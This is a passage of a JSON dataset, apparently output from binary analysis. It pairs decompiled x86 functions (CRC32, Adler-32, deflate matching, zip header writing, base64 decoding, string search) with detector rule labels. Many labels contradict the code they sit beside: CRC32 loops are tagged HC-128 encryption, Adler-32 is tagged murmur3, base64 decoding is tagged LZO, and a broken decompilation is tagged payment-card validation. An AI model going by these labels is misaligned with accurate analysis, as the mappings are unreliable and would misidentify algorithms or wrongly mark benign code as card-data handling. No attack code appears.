*(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x4466f0);\n        arg_ch = arg_ch + 1;\n    }\n    return ~arg_8h;\n}\n",
        "token_count": 572
    },
    "00426c00": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00426c00(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_ch == NULL) {\n        return 0;\n    }\n    arg_8h = ~arg_8h;\n    if (7 < arg_10h) {\n        uVar2 = arg_10h >> 3;\n        do {\n            uVar1 = arg_8h >> 8 ^ *(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x448250);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[1] ^ uVar1) & 0xff) * 4 + 0x448250);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[2] ^ uVar1) & 0xff) * 4 + 0x448250);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[3] ^ uVar1) & 0xff) * 4 + 0x448250);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[4] ^ uVar1) & 0xff) * 4 + 0x448250);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[5] ^ uVar1) & 0xff) * 4 + 0x448250);\n            uVar1 = uVar1 >> 8 ^ *(((arg_ch[6] ^ uVar1) & 0xff) * 4 + 0x448250);\n            arg_8h = uVar1 >> 8 ^ *(((arg_ch[7] ^ uVar1) & 0xff) * 4 + 0x448250);\n            arg_ch = arg_ch + 8;\n            arg_10h = arg_10h - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; arg_10h != 0; arg_10h = arg_10h - 1) {\n        arg_8h = arg_8h >> 8 ^ *(((*arg_ch ^ arg_8h) & 0xff) * 4 + 0x448250);\n        arg_ch = arg_ch + 1;\n    }\n    return ~arg_8h;\n}\n",
        "token_count": 555
    },
    "00407430": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407430(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((arg_ch ^ *arg_8h) & 0xff) * 4 + 0x4466f0) ^ *arg_8h >> 8;\n    *arg_8h = uVar1;\n    uVar1 = ((uVar1 & 0xff) + arg_8h[1]) * 0x8088405 + 1;\n    arg_8h[1] = uVar1;\n    arg_8h[2] = arg_8h[2] >> 8 ^ *(((uVar1 >> 0x18 ^ arg_8h[2]) & 0xff) * 4 + 0x4466f0);\n    return;\n}\n",
        "token_count": 192
    },
    "00407480": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407480(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = arg_8h[2];\n    uVar2 = uVar1 & 0xfffd | 2;\n    uVar2 = *(((arg_ch ^ (uVar2 ^ 1) * uVar2 >> 8 ^ *arg_8h) & 0xff) * 4 + 0x4466f0) ^ *arg_8h >> 8;\n    *arg_8h = uVar2;\n    uVar2 = ((uVar2 & 0xff) + arg_8h[1]) * 0x8088405 + 1;\n    arg_8h[1] = uVar2;\n    arg_8h[2] = uVar1 >> 8 ^ *(((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4 + 0x4466f0);\n    return;\n}\n",
        "token_count": 238
    },
    "0041a420": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041a420(char *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_10h_00;\n    uint unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_40h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e628;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_24h = *0x44792c;\n    var_20h = *0x447930;\n    var_1ch = *0x447934;\n    var_18h = *0x447938;\n    var_14h._0_1_ = *0x44793c;\n    iVar1 = (**0x462f30)(arg_8h, var_10h);\n    if (((0 < iVar1) && (iVar1 = fcn.0042d570(&var_24h, *arg_8h),  iVar1 != 0)) &&\n       (iVar1 = fcn.0042d570(&var_24h, arg_8h[1]),  iVar1 != 0)) {\n        iVar1 = (**0x462f30)(arg_8h);\n        iVar1 = iVar1 + -1;\n        *arg_10h = iVar1;\n        uVar2 = (**0x463094)(8, iVar1);\n        iVar3 = (**0x46301c)(uVar2);\n        *arg_ch = iVar3;\n        if (iVar3 != 0) {\n            fcn.004063a0(arg_8h);\n            var_4h = 0;\n            arg_10h_00 = fcn.0040e6b0(&var_5ch, 2, 0xffffffff);\n            if (0xf < arg_10h_00[5]) {\n                arg_10h_00 = *arg_10h_00;\n            }\n            fcn.0042b111(*arg_ch, iVar1, arg_10h_00);\n            fcn.00405d10();\n            fcn.00405d10();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(unaff_EBX);\n    return;\n}\n",
        "token_count": 648
    },
    "00426d10": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426d10(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((arg_ch ^ *arg_8h) & 0xff) * 4 + 0x448250) ^ *arg_8h >> 8;\n    *arg_8h = uVar1;\n    uVar1 = ((uVar1 & 0xff) + arg_8h[1]) * 0x8088405 + 1;\n    arg_8h[1] = uVar1;\n    arg_8h[2] = arg_8h[2] >> 8 ^ *(((uVar1 >> 0x18 ^ arg_8h[2]) & 0xff) * 4 + 0x448250);\n    return;\n}\n",
        "token_count": 189
    },
    "004074f0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004074f0(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar2 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == NULL) {\n        return 1;\n    }\n    if (arg_10h != 0) {\n        do {\n            uVar1 = arg_10h;\n            if (0x15af < arg_10h) {\n                uVar1 = 0x15b0;\n            }\n            arg_10h = arg_10h - uVar1;\n            if (0xf < uVar1) {\n                uVar18 = uVar1 >> 4;\n                uVar1 = uVar1 + uVar18 * -0x10;\n                do {\n                    iVar3 = uVar2 + *arg_ch;\n                    iVar4 = iVar3 + arg_ch[1];\n                    iVar5 = iVar4 + arg_ch[2];\n                    iVar6 = iVar5 + arg_ch[3];\n                    iVar7 = iVar6 + arg_ch[4];\n                    iVar8 = iVar7 + arg_ch[5];\n                    iVar9 = iVar8 + arg_ch[6];\n                    iVar10 = iVar9 + arg_ch[7];\n                    iVar11 = iVar10 + arg_ch[8];\n                    iVar12 = iVar11 + arg_ch[9];\n                    iVar13 = iVar12 + arg_ch[10];\n                    iVar14 = iVar13 + arg_ch[0xb];\n                    iVar15 = iVar14 + arg_ch[0xc];\n                    iVar16 = iVar15 + arg_ch[0xd];\n                    iVar17 = iVar16 + arg_ch[0xe];\n                    uVar2 = iVar17 + arg_ch[0xf];\n                    arg_8h = arg_8h + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    arg_ch = arg_ch + 0x10;\n                    uVar18 = uVar18 - 1;\n                } while (uVar18 != 0);\n            }\n            for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n                uVar2 = uVar2 + *arg_ch;\n                arg_ch = arg_ch + 1;\n                arg_8h = arg_8h + uVar2;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            arg_8h = arg_8h % 0xfff1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h << 0x10 | uVar2;\n}\n",
        "token_count": 744
    },
    "00426a70": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl\nfcn.00426a70(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h, code *arg_1ch, \n            uint arg_20h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint var_1h;\n    \n    uVar3 = arg_20h;\n    pcVar2 = arg_1ch;\n    (*arg_1ch)(arg_20h, &var_1h, 1);\n    (*pcVar2)(uVar3, &var_1h, 1);\n    arg_1ch = CONCAT13(5, arg_1ch._0_3_);\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = CONCAT13(6, arg_1ch._0_3_);\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_1ch = arg_1ch & 0xffffff;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    uVar1 = arg_8h;\n    arg_1ch = arg_1ch & 0xffffff | arg_8h << 0x18;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    uVar5 = uVar1 >> 8;\n    arg_1ch = arg_1ch & 0xffffff | uVar5 << 0x18;\n    (*pcVar2)(uVar3, &arg_1ch + 3, 1);\n    arg_8h = arg_8h & 0xffffff | arg_8h << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | uVar5 << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    uVar1 = arg_ch;\n    arg_8h = arg_8h & 0xffffff | arg_ch << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 8) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 0x10) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = uVar1 & 0xff000000 | arg_8h & 0xffffff;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    uVar1 = arg_10h;\n    arg_8h = arg_8h & 0xffffff | arg_10h << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 8) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 0x10) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = uVar1 & 0xff000000 | arg_8h & 0xffffff;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    uVar1 = arg_14h;\n    arg_8h = arg_8h & 0xffffff | arg_14h << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (uVar1 >> 8) << 0x18;\n    (*pcVar2)(uVar3, &arg_8h + 3, 1);\n    if (uVar1 != 0) {\n        uVar4 = (*pcVar2)(uVar3, arg_18h, uVar1);\n        if (uVar4 != uVar1) {\n            return 10;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1205
    },
    "004337a0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t * fcn.004337a0(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar8 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar8 ^ 0xffffffff ^ uVar8 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar9 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar9[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar9[2]) break;\n            pcVar1 = pcVar9 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar9 = pcVar9 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 923
    },
    "004275d0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004275d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint uVar2;\n    ulong uVar3;\n    uint arg_8h_00;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    *(in_ECX + 0x7c) = 0;\n    *(in_ECX + 0x84) = arg_8h;\n    *(in_ECX + 0x80) = 0;\n    *(in_ECX + 0x78) = 0;\n    *(in_ECX + 0x90) = 0;\n    *(in_ECX + 0x74) = 0;\n    *(in_ECX + 0x88) = arg_ch;\n    *(in_ECX + 0x8c) = 0;\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        *(in_ECX + 0x70) = arg_ch;\n        *(in_ECX + 0x4c) = 0x80000000;\n        *(in_ECX + 0x6c) = 1;\n        (**0x462fc0)(&var_24h);\n        (**0x462fdc)(&var_24h, &var_2ch);\n        var_34h = var_2ch;\n        var_30h = var_28h;\n        (**0x4630cc)(&var_34h, &var_14h);\n        arg_8h_00 = 10000000;\n        uVar3 = fcn.0042d350(var_2ch + 0x2ac18000, (var_28h + -0x19db1de) - (var_2ch < 0xd53e8000), 10000000, 0);\n        uVar2 = uVar3 >> 0x20;\n        uVar1 = uVar3;\n        *(in_ECX + 0x50) = uVar1;\n        *(in_ECX + 0x58) = uVar1;\n        *(in_ECX + 0x60) = uVar1;\n        *(in_ECX + 0x5c) = uVar2;\n        *(in_ECX + 100) = uVar2;\n        *(in_ECX + 0x54) = uVar2;\n        *(in_ECX + 0x68) =\n             (((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 & 0x7ffU | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f)\n             << 0x10 | (var_ah & 0x3f | (var_eh._2_2_ & 0x1f) << 6) << 5 | var_ah._2_2_ * 2 & 0x1f;\n        fcn.0042a75a(arg_8h_00);\n        return;\n    }\n    fcn.0042a75a(var_34h);\n    return;\n}\n",
        "token_count": 820
    },
    "00427710": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00427710(int32_t param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint arg_8h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    *(param_1 + 0x7c) = 0;\n    *(param_1 + 0x84) = 0;\n    *(param_1 + 0x80) = 0;\n    *(param_1 + 0x78) = 0;\n    *(param_1 + 0x90) = 0;\n    *(param_1 + 0x74) = 0;\n    *(param_1 + 0x4c) = 0x41c00010;\n    *(param_1 + 0x70) = 0;\n    *(param_1 + 0x6c) = 0;\n    (**0x462fc0)(&var_24h);\n    (**0x462fdc)(&var_24h, &var_2ch);\n    var_34h = var_2ch;\n    var_30h = var_28h;\n    (**0x4630cc)(&var_34h, &var_14h);\n    arg_8h = 10000000;\n    uVar3 = fcn.0042d350(var_2ch + 0x2ac18000, (var_28h + -0x19db1de) - (var_2ch < 0xd53e8000), 10000000, 0);\n    uVar2 = uVar3 >> 0x20;\n    uVar1 = uVar3;\n    *(param_1 + 0x50) = uVar1;\n    *(param_1 + 0x58) = uVar1;\n    *(param_1 + 0x60) = uVar1;\n    *(param_1 + 0x5c) = uVar2;\n    *(param_1 + 100) = uVar2;\n    *(param_1 + 0x54) = uVar2;\n    *(param_1 + 0x68) =\n         (((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 & 0x7ffU | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f) <<\n         0x10 | (var_ah & 0x3f | (var_eh._2_2_ & 0x1f) << 6) << 5 | var_ah._2_2_ * 2 & 0x1f;\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 711
    },
    "00426e20": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426e20(uint arg_8h, uint noname_1, uint16_t *arg_10h, uint16_t *arg_14h)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint unaff_EDI;\n    uint var_14h;\n    uint var_eh;\n    uint16_t var_ah;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_14h;\n    puVar1 = arg_10h;\n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    (**0x4630cc)(&arg_8h, &var_14h);\n    *puVar1 = ((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f;\n    *puVar2 = (var_ah & 0x3f | CONCAT22(var_ah, var_eh._2_2_) << 6) << 5 | var_8h * 2 & 0x1fU;\n    fcn.0042a75a(unaff_EDI);\n    return;\n}\n",
        "token_count": 312
    },
    "0043baa5": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0043baa5(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_EDI) {\n        if (*(unaff_EBP + -0x20) != unaff_EDI) {\n            puVar1 = *((*unaff_ESI >> 5) * 4 + 0x464120) + 4 + (*unaff_ESI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.0043a645(*unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00420740": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00420740(int32_t arg_8h, int32_t arg_ch, uint8_t *arg_10h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    puVar3 = arg_10h;\n    if (0 < arg_ch) {\n        do {\n            *puVar3 = *(*(arg_8h + iVar4) + 0x447e00) * '\\x04' | *(*(arg_8h + 1 + iVar4) + 0x447e00) >> 4;\n            puVar3[1] = *(*(arg_8h + 2 + iVar4) + 0x447e00) >> 2 | *(*(arg_8h + 1 + iVar4) + 0x447e00) << 4;\n            pcVar1 = arg_8h + 2 + iVar4;\n            pcVar2 = arg_8h + 3 + iVar4;\n            iVar4 = iVar4 + 4;\n            puVar3[2] = *(*pcVar1 + 0x447e00) << 6 | *(*pcVar2 + 0x447e00);\n            puVar3 = puVar3 + 3;\n        } while (iVar4 < arg_ch);\n    }\n    if (*(arg_8h + -2 + iVar4) != '=') {\n        if (*(arg_8h + -1 + iVar4) != '=') {\n            *puVar3 = 0;\n            return arg_10h;\n        }\n        *(puVar3 + -1) = 0;\n        return arg_10h;\n    }\n    *(puVar3 + -1) = 0;\n    puVar3[-2] = 0;\n    return arg_10h;\n}\n",
        "token_count": 420
    },
    "00425d90": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425d90(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    int32_t iVar8;\n    uint16_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar8 = arg_8h;\n    puVar1 = arg_8h + 0x28;\n    puVar2 = arg_8h + 0x2c;\n    puVar3 = arg_8h + 0x24;\n    puVar4 = arg_8h + 0x20;\n    puVar5 = arg_8h + 0x1c;\n    puVar6 = arg_8h + 0x18;\n    puVar7 = arg_8h + 0x14;\n    iVar11 = 0;\n    iVar10 = 0;\n    puVar9 = arg_8h + 0x34;\n    arg_8h = 0x3c;\n    do {\n        iVar11 = iVar11 + puVar9[-2];\n        iVar10 = iVar10 + *puVar9;\n        puVar9 = puVar9 + 4;\n        arg_8h = arg_8h + -1;\n    } while (arg_8h != 0);\n    arg_8h = 0;\n    var_4h = 0;\n    puVar9 = iVar8 + 0x218;\n    var_8h = 0x40;\n    do {\n        arg_8h = arg_8h + puVar9[-2];\n        var_4h = var_4h + *puVar9;\n        puVar9 = puVar9 + 4;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    **(iVar8 + 0x1af50) =\n         *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + var_4h + arg_8h <=\n         *(iVar8 + 0x210) + iVar10 + iVar11 >> 2;\n    return;\n}\n",
        "token_count": 556
    },
    "00426100": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.00426100(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    uVar4 = *(arg_8h + 0x6af84);\n    var_8h = *(arg_8h + 0x6af94);\n    pcVar8 = *(arg_8h + 0x6af80);\n    pcVar5 = uVar4 + 0x1af70 + arg_8h;\n    if (uVar4 < 0x7efb) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = uVar4 - 0x7efa;\n    }\n    cVar3 = pcVar5[pcVar8 + -1];\n    pcVar2 = uVar4 + 0x1b072 + arg_8h;\n    var_1h._0_1_ = pcVar5[pcVar8];\n    if (*(arg_8h + 0x6af9c) <= pcVar8) {\n        var_8h = var_8h >> 2;\n    }\n    do {\n        pcVar7 = arg_8h + 0x1af70 + arg_ch;\n        if ((((pcVar7[pcVar8] == var_1h) && (pcVar7[pcVar8 + -1] == cVar3)) && (*pcVar7 == *pcVar5)) &&\n           (pcVar7[1] == pcVar5[1])) {\n            pcVar5 = pcVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n            while (((((pcVar6 = pcVar5 + 1,  pcVar5[1] == pcVar7[1] && (pcVar6 = pcVar5 + 2,  pcVar5[2] == pcVar7[2]))\n                     && ((pcVar6 = pcVar5 + 3,  pcVar5[3] == pcVar7[3] &&\n                         ((pcVar6 = pcVar5 + 4,  pcVar5[4] == pcVar7[4] &&\n                          (pcVar6 = pcVar5 + 5,  pcVar5[5] == pcVar7[5])))))) &&\n                    (pcVar6 = pcVar5 + 6,  pcVar5[6] == pcVar7[6])) && (pcVar6 = pcVar5 + 7,  pcVar5[7] == pcVar7[7])))\n            {\n                pcVar1 = pcVar5 + 8;\n                pcVar5 = pcVar5 + 8;\n                pcVar7 = pcVar7 + 8;\n                pcVar6 = pcVar5;\n                if ((*pcVar1 != *pcVar7) || (pcVar2 <= pcVar5)) break;\n            }\n            pcVar7 = pcVar6 + (0x102 - pcVar2);\n            pcVar5 = pcVar2 + -0x102;\n            if (pcVar8 < pcVar7) {\n                *(arg_8h + 0x6af88) = arg_ch;\n                if (*(arg_8h + 0x6afa0) <= pcVar7) {\n                    return pcVar7;\n                }\n                cVar3 = pcVar5[pcVar6 + (0x101 - pcVar2)];\n                var_1h._0_1_ = pcVar5[pcVar7];\n                pcVar8 = pcVar7;\n            }\n        }\n        arg_ch = *(arg_8h + 0x2af70 + (arg_ch & 0x7fff) * 4);\n        if (arg_ch <= var_10h) {\n            return pcVar8;\n        }\n        var_8h = var_8h - 1;\n        if (var_8h == 0) {\n            return pcVar8;\n        }\n    } while( true );\n}\n",
        "token_count": 972
    },
    "00408c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __cdecl fcn.00408c90(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *arg_ch;\n    iVar2 = arg_ch[1];\n    uVar3 = *(arg_8h + 0x34);\n    if (**(arg_8h + 4) < 10) {\n        switch(*(**(arg_8h + 4) * 4 + 0x4086d4)) {\n        case 0x2343fe8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8c48300:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf8950ff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x10488b06:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8b0008c2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x8d52ffff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x9b8dffff:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfdf4b58d:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfef8958d:\n    